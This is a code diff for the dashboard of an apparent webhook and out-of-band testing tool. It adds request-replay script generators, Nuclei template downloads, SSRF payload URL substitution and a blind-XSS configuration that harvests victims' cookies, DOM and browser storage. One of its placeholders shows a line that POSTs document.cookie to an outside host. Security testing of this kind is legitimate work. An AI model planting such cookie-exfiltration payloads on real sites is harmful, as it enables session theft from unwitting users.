@@ -206,7 +206,11 @@ export default function DashboardPage({ params }) {
     telegramToken: '',
     telegramChatId: '',
     discordEnabled: false,
-    discordWebhook: ''
+    discordWebhook: '',
+    xssDomEnabled: true,
+    xssCookiesEnabled: true,
+    xssStorageEnabled: true,
+    xssCustomCode: ''
   });
 
   const [selectedRequest, setSelectedRequest] = useState(null);
@@ -221,7 +225,8 @@ export default function DashboardPage({ params }) {
   const [collabFormat, setCollabFormat] = useState('subpath'); // 'subpath', 'query', 'url', 'host'
   const [isManualPolling, setIsManualPolling] = useState(false);
   const [lastPolledTime, setLastPolledTime] = useState(null);
-  const [activeInspectorTab, setActiveInspectorTab] = useState('RAW'); // 'RAW', 'HEADERS', 'PARAMS', 'BODY', 'RESPONSE', 'FORWARD'
+  const [activeInspectorTab, setActiveInspectorTab] = useState('RAW'); // 'RAW', 'HEADERS', 'PARAMS', 'BODY', 'RESPONSE', 'FORWARD', 'REPLAY'
+  const [replayLanguage, setReplayLanguage] = useState('curl');
   const [showInjectionsDeck, setShowInjectionsDeck] = useState(true);
   const [selectedDeckCategory, setSelectedDeckCategory] = useState('SSRF');
 
@@ -234,6 +239,12 @@ export default function DashboardPage({ params }) {
   const [configTelegramChatId, setConfigTelegramChatId] = useState('');
   const [configDiscordEnabled, setConfigDiscordEnabled] = useState(false);
   const [configDiscordWebhook, setConfigDiscordWebhook] = useState('');
+
+  // Blind XSS custom configurations form states
+  const [xssDomEnabled, setXssDomEnabled] = useState(true);
+  const [xssCookiesEnabled, setXssCookiesEnabled] = useState(true);
+  const [xssStorageEnabled, setXssStorageEnabled] = useState(true);
+  const [xssCustomCode, setXssCustomCode] = useState('');
 
   // Forwarding form state
   const [forwardTarget, setForwardTarget] = useState('');
@@ -667,6 +678,10 @@ export default function DashboardPage({ params }) {
       setConfigTelegramChatId(config.telegramChatId || '');
       setConfigDiscordEnabled(!!config.discordEnabled);
       setConfigDiscordWebhook(config.discordWebhook || '');
+      setXssDomEnabled(config.xssDomEnabled !== undefined ? !!config.xssDomEnabled : true);
+      setXssCookiesEnabled(config.xssCookiesEnabled !== undefined ? !!config.xssCookiesEnabled : true);
+      setXssStorageEnabled(config.xssStorageEnabled !== undefined ? !!config.xssStorageEnabled : true);
+      setXssCustomCode(config.xssCustomCode || '');
     }
   }, [isConfigOpen, config]);
 
@@ -740,7 +755,11 @@ export default function DashboardPage({ params }) {
           telegramToken: configTelegramToken,
           telegramChatId: configTelegramChatId,
           discordEnabled: configDiscordEnabled,
-          discordWebhook: configDiscordWebhook
+          discordWebhook: configDiscordWebhook,
+          xssDomEnabled,
+          xssCookiesEnabled,
+          xssStorageEnabled,
+          xssCustomCode
         })
       });
 
@@ -755,6 +774,23 @@ export default function DashboardPage({ params }) {
       }
     } catch (err) {
       alert('Failed to save configuration.');
+    }
+  };
+
+  // Download a text file (e.g., custom YAML Nuclei template)
+  const handleDownloadFile = (content, filename) => {
+    try {
+      const blob = new Blob([content], { type: 'text/yaml;charset=utf-8;' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', filename);
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    } catch (e) {
+      console.error('File download failed:', e);
+      alert('Failed to generate file download.');
     }
   };
 
@@ -1615,7 +1651,14 @@ export default function DashboardPage({ params }) {
                       className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'FORWARD' ? styles.inspectorTabBtnActive : ''}`}
                     >
                       <Send size={13} />
-                      <span>Forward / Replay</span>
+                      <span>Forward / Proxy</span>
+                    </button>
+                    <button 
+                      onClick={() => setActiveInspectorTab('REPLAY')}
+                      className={`${styles.inspectorTabBtn} ${activeInspectorTab === 'REPLAY' ? styles.inspectorTabBtnActive : ''}`}
+                    >
+                      <Play size={13} />
+                      <span>Replay Scripts</span>
                     </button>
                   </div>
 
@@ -1848,6 +1891,211 @@ export default function DashboardPage({ params }) {
                           )}
                         </div>
                       )}
+                    </div>
+                  )}
+
+                  {/* TAB CONTENT: EXPLOIT REPLAYER & CODE GEN */}
+                  {activeInspectorTab === 'REPLAY' && (
+                    <div style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
+                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)' }}>
+                          Generate production-grade exploits or script code to reproduce this exact request
+                        </span>
+                        
+                        <div style={{ display: 'flex', gap: '4px', background: 'var(--bg-input)', padding: '2px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)' }}>
+                          {['curl', 'python', 'go', 'fetch', 'nuclei'].map(lang => (
+                            <button
+                              key={lang}
+                              onClick={() => setReplayLanguage(lang)}
+                              type="button"
+                              style={{
+                                padding: '4px 8px',
+                                border: 'none',
+                                background: replayLanguage === lang ? 'var(--bg-surface-elevated)' : 'transparent',
+                                color: replayLanguage === lang ? 'var(--text-main)' : 'var(--text-muted)',
+                                borderRadius: 'var(--radius-xs)',
+                                fontSize: '0.68rem',
+                                fontWeight: '600',
+                                cursor: 'pointer',
+                                textTransform: 'capitalize'
+                              }}
+                            >
+                              {lang === 'fetch' ? 'Fetch' : lang === 'nuclei' ? 'Nuclei' : lang}
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+
+                      {(() => {
+                        let code = '';
+                        let filename = '';
+                        let langTag = 'bash';
+
+                        // Calculate path and query
+                        const path = selectedRequest.path || '/';
+                        const queryString = selectedRequest.query && Object.keys(selectedRequest.query).length > 0
+                          ? '?' + Object.entries(selectedRequest.query).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(Array.isArray(v) ? v.join(',') : v)}`).join('&')
+                          : '';
+                        const fullPath = path + queryString;
+                        const requestHost = selectedRequest.headers?.host || webhookHost || 'target-domain.com';
+                        const isSsl = !requestHost.includes('localhost') && !requestHost.includes('127.0.0.1');
+                        const originalUrl = `${isSsl ? 'https' : 'http'}://${requestHost}${fullPath}`;
+
+                        if (replayLanguage === 'curl') {
+                          langTag = 'bash';
+                          filename = 'replay.sh';
+                          // Build headers flags
+                          const headersStr = Object.entries(selectedRequest.headers || {})
+                            .filter(([k]) => !['content-length', 'host'].includes(k.toLowerCase()))
+                            .map(([k, v]) => `-H "${k.replace(/"/g, '\\"')}: ${v.replace(/"/g, '\\"')}"`)
+                            .join(' \\\n  ');
+                          
+                          // Build body flag
+                          let bodyStr = '';
+                          if (selectedRequest.body) {
+                            const escapedBody = selectedRequest.body.replace(/'/g, "'\\''");
+                            bodyStr = ` \\\n  --data-binary '${escapedBody}'`;
+                          }
+
+                          code = `curl -X ${selectedRequest.method} "${originalUrl}" \\\n  ${headersStr}${bodyStr}`;
+
+                        } else if (replayLanguage === 'python') {
+                          langTag = 'python';
+                          filename = 'replay.py';
+                          
+                          const headersDict = {};
+                          Object.entries(selectedRequest.headers || {}).forEach(([k, v]) => {
+                            if (!['content-length', 'host'].includes(k.toLowerCase())) {
+                              headersDict[k] = v;
+                            }
+                          });
+
+                          let payloadDef = 'payload = None';
+                          let reqArg = '';
+                          if (selectedRequest.body) {
+                            if (selectedRequest.bodyType === 'json') {
+                              try {
+                                const parsed = JSON.parse(selectedRequest.body);
+                                payloadDef = `payload = ${JSON.stringify(parsed, null, 4)}`;
+                                reqArg = ', json=payload';
+                              } catch(e) {
+                                payloadDef = `payload = """${selectedRequest.body.replace(/"""/g, '\\"\\"\\"')}"""`;
+                                reqArg = ', data=payload';
+                              }
+                            } else {
+                              payloadDef = `payload = """${selectedRequest.body.replace(/"""/g, '\\"\\"\\"')}"""`;
+                              reqArg = ', data=payload';
+                            }
+                          }
+
+                          code = `import requests\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nurl = "${originalUrl}"\n\nheaders = ${JSON.stringify(headersDict, null, 4)}\n\n${payloadDef}\n\nresponse = requests.${selectedRequest.method.toLowerCase()}(\n    url,\n    headers=headers${reqArg},\n    verify=False\n)\n\nprint(f"Status Code: {response.status_code}")\nprint(response.text)\n`;
+
+                        } else if (replayLanguage === 'go') {
+                          langTag = 'go';
+                          filename = 'replay.go';
+
+                          let bodyReader = 'nil';
+                          let importString = '"net/http"\n\t"io"\n\t"fmt"\n\t"crypto/tls"';
+                          let bodyInit = '';
+
+                          if (selectedRequest.body) {
+                            importString = '"net/http"\n\t"io"\n\t"fmt"\n\t"strings"\n\t"crypto/tls"';
+                            bodyInit = `\tbody := \`${selectedRequest.body.replace(/`/g, '` + "`" + `')}\`\n`;
+                            bodyReader = 'strings.NewReader(body)';
+                          }
+
+                          let headersInit = '';
+                          Object.entries(selectedRequest.headers || {}).forEach(([k, v]) => {
+                            if (!['content-length', 'host'].includes(k.toLowerCase())) {
+                              headersInit += `\treq.Header.Set("${k.replace(/"/g, '\\"')}", "${v.replace(/"/g, '\\"')}")\n`;
+                            }
+                          });
+
+                          code = `package main\n\nimport (\n\t${importString}\n)\n\nfunc main() {\n\turl := "${originalUrl}"\n${bodyInit}\n\treq, err := http.NewRequest("${selectedRequest.method}", url, ${bodyReader})\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n${headersInit}\n\ttr := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n\t}\n\tclient := &http.Client{Transport: tr}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tfmt.Println("Response Status:", resp.Status)\n\tbodyBytes, _ := io.ReadAll(resp.Body)\n\tfmt.Println(string(bodyBytes))\n}\n`;
+
+                        } else if (replayLanguage === 'fetch') {
+                          langTag = 'javascript';
+                          filename = 'replay.js';
+
+                          const headersDict = {};
+                          Object.entries(selectedRequest.headers || {}).forEach(([k, v]) => {
+                            if (!['content-length', 'host'].includes(k.toLowerCase())) {
+                              headersDict[k] = v;
+                            }
+                          });
+
+                          const fetchOptions = {
+                            method: selectedRequest.method,
+                            headers: headersDict,
+                          };
+
+                          if (selectedRequest.body) {
+                            fetchOptions.body = selectedRequest.body;
+                          }
+
+                          const optionsStr = JSON.stringify(fetchOptions, null, 2);
+
+                          code = `// Modern JS Fetch Replayer\nfetch("${originalUrl}", ${optionsStr})\n  .then(res => {\n    console.log("Status:", res.status);\n    return res.text();\n  })\n  .then(text => console.log(text))\n  .catch(err => console.error(err));\n`;
+
+                        } else if (replayLanguage === 'nuclei') {
+                          langTag = 'yaml';
+                          filename = `nuclei-poc-${selectedRequest.requestId.substring(0, 8)}.yaml`;
+
+                          // Construct custom nuclei template matching request
+                          let rawRequestBlock = `${selectedRequest.method} ${fullPath} HTTP/1.1\nHost: {{Hostname}}\n`;
+                          Object.entries(selectedRequest.headers || {}).forEach(([k, v]) => {
+                            if (k.toLowerCase() !== 'host') {
+                              rawRequestBlock += `${k}: ${v}\n`;
+                            }
+                          });
+                          if (selectedRequest.body) {
+                            rawRequestBlock += `\n${selectedRequest.body}`;
+                          }
+
+                          const indentedRaw = rawRequestBlock.split('\n').map(line => `        ${line}`).join('\n');
+
+                          code = `id: custom-nuclei-poc-${selectedRequest.requestId.substring(0, 8)}\n\ninfo:\n  name: Custom Captured HTTP Reproducer PoC\n  author: Webhook Inspector\n  severity: medium\n  description: Automatically synthesized reproducibility template representing a captured OOB callback.\n  tags: custom,reproducer,ssrf,oob\n\nhttp:\n  - raw:\n      - |\n${indentedRaw}\n\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 201\n          - 202\n          - 204\n          - 302\n`;
+                        }
+
+                        return (
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                              <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
+                                File: {filename}
+                              </span>
+                              <div style={{ display: 'flex', gap: '8px' }}>
+                                <button
+                                  onClick={() => handleCopy(code, `replay-${replayLanguage}`)}
+                                  className="btn-secondary"
+                                  type="button"
+                                  style={{ padding: '4px 10px', fontSize: '0.72rem' }}
+                                >
+                                  {copiedText === `replay-${replayLanguage}` ? (
+                                    <span style={{ display: 'flex', alignItems: 'center', gap: '4px', color: 'var(--color-success)' }}>
+                                      <Check size={12} /> Copied
+                                    </span>
+                                  ) : (
+                                    <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
+                                      <Copy size={12} /> Copy Snippet
+                                    </span>
+                                  )}
+                                </button>
+                                <button
+                                  onClick={() => handleDownloadFile(code, filename)}
+                                  className="btn-secondary"
+                                  type="button"
+                                  style={{ padding: '4px 10px', fontSize: '0.72rem', display: 'flex', alignItems: 'center', gap: '4px' }}
+                                >
+                                  <ExternalLink size={12} /> Download File
+                                </button>
+                              </div>
+                            </div>
+                            <pre className={styles.rawHttpContainer} style={{ maxHeight: '350px', overflowY: 'auto', background: 'var(--bg-input)', padding: '14px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)' }}>
+                              <code className={`language-${langTag}`} style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>{code}</code>
+                            </pre>
+                          </div>
+                        );
+                      })()}
                     </div>
                   )}
 
@@ -2167,10 +2415,10 @@ export default function DashboardPage({ params }) {
                           paddingBottom: '2px'
                         }}
                       >
-                        {bypass.payload}
+                        {bypass.payload.replace('[WEBHOOK_URL]', webhookUrl || '')}
                       </span>
                       <button 
-                        onClick={() => handleCopy(bypass.payload, `ssrf-${idx}`)}
+                        onClick={() => handleCopy(bypass.payload.replace('[WEBHOOK_URL]', webhookUrl || ''), `ssrf-${idx}`)}
                         className={styles.copyBtn}
                         style={{ flexShrink: '0' }}
                       >
@@ -2583,12 +2831,21 @@ http:
                           <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                             inspector-ssrf-oob.yaml
                           </span>
-                          <button
-                            onClick={() => handleCopy(ssrfTemplateCode, 'ssrf-yaml')}
-                            className={styles.copyBtn}
-                          >
-                            {copiedText === 'ssrf-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
-                          </button>
+                          <div style={{ display: 'flex', gap: '8px' }}>
+                            <button
+                              onClick={() => handleCopy(ssrfTemplateCode, 'ssrf-yaml')}
+                              className={styles.copyBtn}
+                            >
+                              {copiedText === 'ssrf-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
+                            </button>
+                            <button
+                              onClick={() => handleDownloadFile(ssrfTemplateCode, 'inspector-ssrf-oob.yaml')}
+                              className={styles.copyBtn}
+                              style={{ display: 'flex', alignItems: 'center', gap: '4px' }}
+                            >
+                              <ExternalLink size={12} /> Download
+                            </button>
+                          </div>
                         </div>
                         <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                           {ssrfTemplateCode}
@@ -2648,12 +2905,21 @@ http:
                           <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                             inspector-blind-xss.yaml
                           </span>
-                          <button
-                            onClick={() => handleCopy(xssTemplateCode, 'xss-yaml')}
-                            className={styles.copyBtn}
-                          >
-                            {copiedText === 'xss-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
-                          </button>
+                          <div style={{ display: 'flex', gap: '8px' }}>
+                            <button
+                              onClick={() => handleCopy(xssTemplateCode, 'xss-yaml')}
+                              className={styles.copyBtn}
+                            >
+                              {copiedText === 'xss-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
+                            </button>
+                            <button
+                              onClick={() => handleDownloadFile(xssTemplateCode, 'inspector-blind-xss.yaml')}
+                              className={styles.copyBtn}
+                              style={{ display: 'flex', alignItems: 'center', gap: '4px' }}
+                            >
+                              <ExternalLink size={12} /> Download
+                            </button>
+                          </div>
                         </div>
                         <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                           {xssTemplateCode}
@@ -2698,12 +2964,21 @@ webhook:
                             <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                               reporting-config.yaml
                             </span>
-                            <button
-                              onClick={() => handleCopy(reportConfig, 'report-yaml')}
-                              className={styles.copyBtn}
-                            >
-                              {copiedText === 'report-yaml' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
-                            </button>
+                            <div style={{ display: 'flex', gap: '8px' }}>
+                              <button
+                                onClick={() => handleCopy(reportConfig, 'report-yaml')}
+                                className={styles.copyBtn}
+                              >
+                                {copiedText === 'report-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
+                              </button>
+                              <button
+                                onClick={() => handleDownloadFile(reportConfig, 'reporting-config.yaml')}
+                                className={styles.copyBtn}
+                                style={{ display: 'flex', alignItems: 'center', gap: '4px' }}
+                              >
+                                <ExternalLink size={12} /> Download
+                              </button>
+                            </div>
                           </div>
                           <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                             {reportConfig}
@@ -3011,6 +3286,69 @@ webhook:
                     </div>
                   )}
                 </div>
+              </div>
+            </div>
+
+            {/* Blind XSS Payload Customizer */}
+            <div style={{ borderTop: '1px solid var(--border-light)', paddingTop: '16px', marginTop: '16px' }}>
+              <h4 style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '14px' }}>
+                <ShieldAlert size={14} style={{ color: 'var(--color-primary)' }} />
+                Blind XSS Hunter Configuration
+              </h4>
+
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px', marginBottom: '12px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <input 
+                    type="checkbox" 
+                    id="xss_dom_enabled"
+                    checked={xssDomEnabled} 
+                    onChange={(e) => setXssDomEnabled(e.target.checked)}
+                    style={{ cursor: 'pointer', width: '14px', height: '14px', accentColor: 'var(--color-primary)' }}
+                  />
+                  <label htmlFor="xss_dom_enabled" style={{ fontSize: '0.78rem', color: 'var(--text-main)', cursor: 'pointer' }}>
+                    Harvest DOM HTML Snapshots
+                  </label>
+                </div>
+
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <input 
+                    type="checkbox" 
+                    id="xss_cookies_enabled"
+                    checked={xssCookiesEnabled} 
+                    onChange={(e) => setXssCookiesEnabled(e.target.checked)}
+                    style={{ cursor: 'pointer', width: '14px', height: '14px', accentColor: 'var(--color-primary)' }}
+                  />
+                  <label htmlFor="xss_cookies_enabled" style={{ fontSize: '0.78rem', color: 'var(--text-main)', cursor: 'pointer' }}>
+                    Harvest Document Cookies
+                  </label>
+                </div>
+
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <input 
+                    type="checkbox" 
+                    id="xss_storage_enabled"
+                    checked={xssStorageEnabled} 
+                    onChange={(e) => setXssStorageEnabled(e.target.checked)}
+                    style={{ cursor: 'pointer', width: '14px', height: '14px', accentColor: 'var(--color-primary)' }}
+                  />
+                  <label htmlFor="xss_storage_enabled" style={{ fontSize: '0.78rem', color: 'var(--text-main)', cursor: 'pointer' }}>
+                    Harvest Local & Session Storage
+                  </label>
+                </div>
+              </div>
+
+              <div className={styles.configFieldFull}>
+                <label className={styles.fieldLabel} style={{ fontSize: '0.72rem', display: 'flex', justifyContent: 'space-between' }}>
+                  <span>Custom JS Payload (Appended)</span>
+                  <span style={{ color: 'var(--text-muted)', fontWeight: 'normal' }}>Runs inside victim context</span>
+                </label>
+                <textarea 
+                  placeholder="// e.g. console.log('XSS Triggered!');&#10;// fetch('https://another-url.com', {method:'POST', body: document.cookie});"
+                  value={xssCustomCode}
+                  onChange={(e) => setXssCustomCode(e.target.value)}
+                  className={styles.textareaField}
+                  style={{ height: '70px', fontFamily: 'monospace', fontSize: '0.75rem' }}
+                />
               </div>
             </div>
 
